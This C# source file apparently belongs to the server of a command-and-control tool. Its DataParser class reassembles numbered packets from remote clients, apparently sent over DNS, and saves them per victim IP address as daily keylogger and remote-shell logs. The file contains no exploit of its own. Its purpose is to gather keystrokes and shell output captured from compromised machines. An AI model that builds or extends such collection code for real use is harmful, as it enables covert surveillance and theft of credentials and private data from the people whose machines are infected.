using System.Text;

namespace Server.Models
{
    public enum LogType
    {
        Keylogger,
        Shell
    }

    public class DataParser
    {
        public string ClientIP { get; }
        public DateTime CreatedAt { get; }
        public int LastReceivedPacket { get; private set; }
        private readonly List<byte> _data;
        private readonly string _logBasePath;
        private string? _clientLogPath;

        public DataParser(string clientIP, string logBasePath)
        {
            ClientIP = clientIP;
            CreatedAt = DateTime.Now;
            LastReceivedPacket = -1;
            _data = new List<byte>();
            _logBasePath = logBasePath;
            
            // Create client-specific directory: logs/IP/
            _clientLogPath = Path.Combine(_logBasePath, ClientIP.Replace(":", "_"));
            Directory.CreateDirectory(_clientLogPath);
        }

        public int DataLength => _data.Count;


        public void AddData(int packetNumber, byte[] data)
        {
            if (packetNumber == LastReceivedPacket)
            {
                throw new DuplicatePacketException();
            }
            
            if (!(packetNumber > LastReceivedPacket || packetNumber == 0))
            {
                LastReceivedPacket = 0;
                throw new PacketsOutOfOrderException();
            }

            _data.AddRange(data);
            LastReceivedPacket = packetNumber;
        }


        public string GetAllData()
        {
            return Encoding.ASCII.GetString(_data.ToArray());
        }
        
        public void SaveToFile(string logPath, int connectionId)
        {
            // Legacy method - kept for compatibility
            Directory.CreateDirectory(logPath);
            string filename = Path.Combine(logPath, 
                $"client_{connectionId}_{ClientIP}_{DateTimeOffset.Now.ToUnixTimeSeconds()}.log");
            File.WriteAllText(filename, GetAllData(), Encoding.ASCII);
        }

        /// <summary>
        /// Save data immediately to type-specific log file
        /// </summary>
        public void SaveDataByType(string data, LogType logType)
        {
            if (string.IsNullOrEmpty(_clientLogPath)) return;

            string prefix = logType == LogType.Keylogger ? "keylog" : "shell";
            string date = DateTime.Now.ToString("yyyy-MM-dd");
            string filename = Path.Combine(_clientLogPath, $"{prefix}_{date}.txt");

            // Append mode - multiple sessions in same day
            string timestamp = DateTime.Now.ToString("HH:mm:ss");
            string logLine = $"[{timestamp}] {data}\n";
            
            File.AppendAllText(filename, logLine, Encoding.UTF8);
        }
    }

    public class DuplicatePacketException : Exception { }
    // PacketsOutOfOrderException defined in DNSProtocol.cs to avoid duplication
}
